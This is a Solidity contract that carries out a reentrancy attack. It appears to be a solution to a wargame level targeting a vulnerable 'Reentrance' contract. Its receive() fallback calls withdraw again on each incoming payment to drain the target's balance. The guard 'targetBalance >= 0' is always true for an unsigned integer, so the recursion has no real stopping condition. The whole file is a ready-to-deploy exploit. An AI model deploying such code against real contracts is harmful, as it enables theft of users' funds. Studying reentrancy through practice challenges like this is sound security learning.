// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "hardhat/console.sol";

interface Reentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
  function balanceOf(address _who) external returns (uint balance);
}

contract ReentranceAttack {
  
  Reentrance reentranceContract;

  constructor (address _reentrance) public {
    reentranceContract = Reentrance(_reentrance);
  }
  function attack() external payable {
    reentranceContract.donate{value: msg.value}(address(this));
    reentranceContract.withdraw(msg.value);
  }

  receive() external payable{
    uint targetBalance = address(reentranceContract).balance;
    if (targetBalance >= 0) {
        uint amountToWithdraw = targetBalance >= msg.value ? msg.value : targetBalance;
        reentranceContract.withdraw(amountToWithdraw);
    }
  }
}